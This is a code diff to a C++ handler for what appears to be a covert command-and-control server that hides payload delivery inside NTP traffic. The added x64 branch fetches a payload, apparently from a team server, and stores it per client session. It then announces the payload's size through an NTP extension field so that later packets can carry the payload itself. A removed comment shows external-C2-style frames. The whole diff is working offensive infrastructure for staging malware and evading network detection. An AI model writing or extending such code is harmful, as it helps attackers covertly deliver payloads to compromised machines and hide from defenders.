@@ -100,7 +100,6 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             //once we have the data, create a new packet with the extension field
             //this needs to be a size packet, which sends back the size of the payload.
             //future packets, wtih 0x00, will send the aactual paylaod
-
             std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());
 
             NTPPacket newPacketClass;
@@ -117,15 +116,31 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 
         else if (payloadArch == 0x64) {
             std::cout << "[?] X64 Payload Requested " << std::endl;
+            //1. Get paylaod form TS
+            std::vector<uint8_t> payload = getx64Payload();
 
-            /*
-            * const these plz
-            send_frame(socket_extc2, "arch=x64", 8);
-            send_frame(socket_extc2, "pipename=foobar", 15);
-            send_frame(socket_extc2, "block=100", 9);
+            //create or access client class - currnetly only creates
+            ClientSession someClient(sessionId);
+            someClient.setForClientBuffer(payload);
+            std::cout << "[?] Stored payload in client class";
+            //printHexVector(someClient.getForClientBuffer());
 
-            //get frames back, load into client class
-            */
+
+            //once we have the data, create a new packet with the extension field
+            //this needs to be a size packet, which sends back the size of the payload.
+            //future packets, wtih 0x00, will send the aactual paylaod
+            std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());
+
+            NTPPacket newPacketClass;
+            newPacketClass.addExtensionField(
+                NtpExtensionField::sizePacket,
+                sizeOfDataButAsAVectorBecauseEverythingIsAVector
+            );
+
+            auto newPacket = newPacketClass.getPacket();
+
+            sendNtpPacket(client_addr, sock, newPacket);
+            return; //done, so don't continue
         }
 
         else if (payloadArch == 0x00) {
